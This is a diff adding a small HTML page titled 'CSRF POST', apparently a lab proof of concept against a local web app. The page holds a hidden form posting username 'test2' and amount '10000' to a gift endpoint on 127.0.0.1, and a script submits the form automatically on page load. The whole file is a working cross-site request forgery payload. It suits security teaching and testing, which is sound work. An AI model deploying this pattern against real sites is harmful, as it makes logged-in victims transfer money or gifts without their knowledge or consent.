@@ -1,0 +1,19 @@
+<html>
+<!DOCTYPE html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="referrer" content="strict-origin-when-cross-origin" />
+  <title>CSRF POST</title>
+</head>
+<body>
+<!-- <iframe style="display: none;" name="csrf-frame"></iframe> -->
+<form action="http://127.0.0.1:8000/gift.html" method="POST" id="csrf-form">
+    <input type='hidden' name='username' value='test2' />
+    <input type='hidden' name='amount' value='10000' />
+    <input type='submit' value='submit'>
+</form>
+<script>
+  document.getElementById("csrf-form").submit()
+</script>
+</body>
+</html>
